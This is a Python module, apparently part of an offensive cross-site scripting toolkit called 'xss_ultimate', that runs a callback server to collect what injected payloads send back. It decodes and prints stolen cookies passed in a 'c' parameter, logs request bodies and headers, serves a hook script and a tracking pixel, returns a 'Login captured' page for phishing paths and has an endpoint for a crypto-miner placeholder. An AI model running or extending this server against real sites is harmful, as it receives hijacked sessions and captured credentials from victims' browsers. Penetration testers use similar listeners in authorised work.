import json
import os
import threading
import time
import socket
import select
import re
from datetime import datetime
from typing import Optional, List, Dict
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

from . import config


class CollabHandler(BaseHTTPRequestHandler):
    interactions = []
    server_instance = None
    log_callback = None

    def do_GET(self):
        self._handle_request()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace") if length > 0 else ""
        self._handle_request(body)

    def do_HEAD(self):
        self._handle_request()

    def log_message(self, format, *args):
        pass

    def _handle_request(self, body=""):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        interaction = {
            "timestamp": datetime.now().isoformat(),
            "method": self.command,
            "path": self.path,
            "headers": dict(self.headers),
            "params": {k: v[0] if len(v) == 1 else v for k, v in params.items()},
            "body": body,
            "remote_ip": self.client_address[0],
        }
        CollabHandler.interactions.append(interaction)
        if CollabHandler.log_callback:
            CollabHandler.log_callback(interaction)
        # Respond with a 1x1 GIF for image requests, JS for script requests
        if self.path.endswith(".js") or "hook" in self.path:
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'// xss_ultimate hook loaded\n')
        elif self.path.endswith(".gif") or "track" in self.path or "pixel" in self.path:
            self.send_response(200)
            self.send_header("Content-Type", "image/gif")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
        elif "phish" in self.path:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'<html><body><h1>Login captured</h1><p>Thank you. You may close this window.</p></body></html>')
        elif "miner" in self.path:
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.end_headers()
            self.wfile.write(b'// Crypto miner placeholder\n')
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'XSS callback received\n')


class CollabServer:
    def __init__(self, host="0.0.0.0", port=9999):
        self.host = host
        self.port = port
        self.server: Optional[HTTPServer] = None
        self.thread: Optional[threading.Thread] = None
        self.interactions: List[Dict] = []
        self._running = False
        self.callback_url = f"http://localhost:{port}"

    def start(self):
        if self._running:
            return
        CollabHandler.interactions = []
        CollabHandler.log_callback = self._on_interaction
        self.server = HTTPServer((self.host, self.port), CollabHandler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self._running = True
        print(f"  Collab server listening on http://{self.host}:{self.port}")

    def stop(self):
        if self.server and self._running:
            self.server.shutdown()
            self._running = False
            print("  Collab server stopped")

    def _on_interaction(self, interaction: Dict):
        self.interactions.append(interaction)
        self._print_interaction(interaction)

    def _print_interaction(self, i: Dict):
        cookie = i["params"].get("c", "")
        if cookie:
            try:
                import base64
                decoded = base64.b64decode(cookie).decode("utf-8", errors="replace")
                print(f"    COOKIES: {decoded}")
            except Exception:
                print(f"    COOKIES (encoded): {cookie}")
        print(f"    [{i['timestamp']}] {i['method']} {i['path']} from {i['remote_ip']}")
        if i.get("body"):
            body_preview = i["body"][:200]
            print(f"    Body: {body_preview}")
        if i["params"]:
            for k, v in i["params"].items():
                if k != "c":
                    print(f"    {k}={v[:100] if isinstance(v, str) else v}")

    def get_interactions(self) -> List[Dict]:
        return list(self.interactions)

    def get_callback_url(self) -> str:
        return f"http://{self.get_external_ip()}:{self.port}"

    def get_external_ip(self) -> str:
        try:
            import requests
            r = requests.get("https://api.ipify.org", timeout=5)
            if r.status_code == 200:
                return r.text.strip()
        except Exception:
            pass
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            pass
        return "127.0.0.1"

    def wait_for_interaction(self, timeout=30) -> Optional[Dict]:
        start = time.time()
        initial_count = len(self.interactions)
        while time.time() - start < timeout:
            if len(self.interactions) > initial_count:
                return self.interactions[-1]
            time.sleep(0.5)
        return None
